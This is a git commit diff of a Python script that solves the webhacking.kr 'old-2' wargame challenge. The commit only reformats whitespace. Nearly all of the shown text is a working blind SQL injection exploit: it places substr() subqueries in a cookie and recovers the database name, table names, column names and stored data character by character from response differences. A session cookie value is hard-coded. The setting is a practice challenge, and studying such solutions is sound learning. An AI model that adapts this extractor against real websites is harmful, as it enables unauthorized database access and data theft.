0b3c2efc8bf479ad7e4f6b27ec4a801d66f5d78d
wjdtkdals159@gmail.com <wjdtkdals159@gmail.com>
2022-03-16 23:52:39 +0900

    webhacking.kr old-2

--- old2_blindSQL.py
+++ old2_blindSQL.py
@@ -1,40 +1,40 @@
 import requests as req
 
-def HttpRequest(d_name=None,c_name=None,t_name=None):
+def HttpRequest(d_name = None ,c_name = None, t_name = None):
     global ch
     value=''
-    for i in range(1,20):
+    for i in range(1, 20):
         for key in keyword:
-            if ch==0:
-                cookies['time'] = 'substr((select database()),{},1)="{}"'.format(i,key)
-            elif ch==1:
+            if ch == 0:
+                cookies['time'] = 'substr((select database()),{},1)="{}"'.format(i, key)
+            elif ch == 1:
                 cookies['time'] = 'substr((select group_concat(table_name) from information_schema.tables \
-                where table_schema="{}"),{},1)="{}"'.format(db_name,i,key)
-            elif ch==2:
+                where table_schema="{}"),{},1)="{}"'.format(db_name, i, key)
+            elif ch == 2:
                 cookies['time'] = 'substr((select group_concat(column_name) from information_schema.columns where \
-                table_name="{}"),{},1)="{}"'.format(table_name,i,key)
-            elif ch==3:
-                cookies['time'] = 'substr((select {} from {}),{},1)="{}"'.format(column_name,table_name,i,key)
-            res = req.get(url,cookies=cookies)
+                table_name="{}"),{},1)="{}"'.format(table_name, i, key)
+            elif ch == 3:
+                cookies['time'] = 'substr((select {} from {}),{},1)="{}"'.format(column_name, table_name, i, key)
+            res = req.get(url, cookies = cookies)
 
             if "09:00:01" in res.text:
-                value+=key
+                value += key
                 print(value)
                 break
             if key == '0':
                 print("END")
-                ch+=1
+                ch += 1
                 return value
 
 if __name__ == '__main__':
     url = 'https://webhacking.kr/challenge/web-02/'
-    cookies = {'PHPSESSID':'4br5ahi1ireolrpccgi2fqfbpr'}
+    cookies = {'PHPSESSID': '4br5ahi1ireolrpccgi2fqfbpr'}
     keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-    ch=0
+    ch = 0
     db_name = HttpRequest()
     table_name = HttpRequest(d_name=db_name)
     column_name = HttpRequest(t_name=table_name)
-    data = HttpRequest(c_name=column_name,t_name=table_name)
+    data = HttpRequest(c_name=column_name, t_name=table_name)
 
     print("============================")
     print("DB NAME = "+db_name)
